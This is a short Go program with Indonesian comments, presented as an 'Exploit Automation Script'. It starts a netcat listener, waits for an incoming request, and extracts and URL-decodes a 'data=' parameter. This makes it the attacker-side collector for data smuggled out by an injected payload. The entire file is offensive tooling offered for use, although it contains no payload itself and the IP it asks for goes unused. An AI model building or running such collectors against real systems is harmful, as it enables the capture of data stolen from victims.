package main

import (
	"fmt"
	"os/exec"
	"net/url"
	"bufio"
	"regexp"
)

// Fungsi untuk menjalankan netcat dan mendapatkan output
func runNetcat(ip string, port string) (string, error) {
	// Menjalankan perintah netcat
	cmd := exec.Command("nc", "-lvnp", port)
	// Membuka pipe untuk menangkap output dari netcat
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err
	}
	
	// Mulai menjalankan netcat
	err = cmd.Start()
	if err != nil {
		return "", err
	}

	// Membaca output dari netcat
	scanner := bufio.NewScanner(stdout)
	var result string
	for scanner.Scan() {
		result += scanner.Text() + "\n"
	}

	// Tunggu sampai proses selesai
	cmd.Wait()

	return result, nil
}

// Fungsi untuk mendecode dan menampilkan data yang telah diparse
func prettifyData(encodedData string) string {
	// Decode URL-encoded data
	decodedData, err := url.QueryUnescape(encodedData)
	if err != nil {
		return fmt.Sprintf("Error decoding data: %v", err)
	}
	
	// Format data dengan menambahkan tag <pre> agar lebih cantik
	return fmt.Sprintf("<pre>\n%s\n</pre>", decodedData)
}

func main() {
	// Banner
	fmt.Println(`
                 /\_/\\  
           _____/ o o \\ 
         /~____  =ø= /   
        (______)__m_m)
        
       Exploit Automation Script
    --------------------------------
    harus di jalankan dengan sudo
    sudo go run nc.go
    --------------------------------
    `)

	// Input IP listener dan port
	var ip string
	var port string
	fmt.Print("Masukkan IP listener Anda: ")
	fmt.Scanln(&ip)
	fmt.Print("Masukkan port listener Anda: ")
	fmt.Scanln(&port)

	// Menjalankan netcat untuk mendapatkan output data
	fmt.Println("[*] Menunggu koneksi...")
	output, err := runNetcat(ip, port)
	if err != nil {
		fmt.Printf("[-] Error menjalankan netcat: %v\n", err)
		return
	}

	// Menemukan data yang dikirim di dalam query parameter "data="
	re := regexp.MustCompile(`data=([^ ]+)`)
	match := re.FindStringSubmatch(output)
	if len(match) > 1 {
		// Menampilkan data dengan format yang lebih cantik
		fmt.Println("[*] Data diterima, memproses...")
		prettyData := prettifyData(match[1])
		fmt.Println("\n--- Decoded and Prettified Data ---")
		fmt.Println(prettyData)
		fmt.Println("\n----------------------------------")
	} else {
		fmt.Println("[-] Tidak ada data yang ditemukan dalam output netcat.")
	}
}
